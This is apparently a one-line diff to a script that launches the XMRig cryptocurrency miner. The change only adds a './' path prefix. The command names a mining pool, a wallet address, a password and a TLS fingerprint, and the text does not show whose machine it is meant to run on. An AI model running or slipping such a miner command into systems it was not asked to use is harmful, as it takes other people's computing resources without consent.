@@ -1,1 +1,1 @@
-xmrig --url pool.hashvault.pro:80 --user 43GwapHXZarawAUSupTEvLb4M9Ho1pmcGRrLTLmjWq7vitTiD7NztpXZqjqqGWPH3r4mLZ9nWBJ2FNjyc3AgcwFQ13MrZbf --pass Microwave1 -t 3 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+./xmrig --url pool.hashvault.pro:80 --user 43GwapHXZarawAUSupTEvLb4M9Ho1pmcGRrLTLmjWq7vitTiD7NztpXZqjqqGWPH3r4mLZ9nWBJ2FNjyc3AgcwFQ13MrZbf --pass Microwave1 -t 3 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
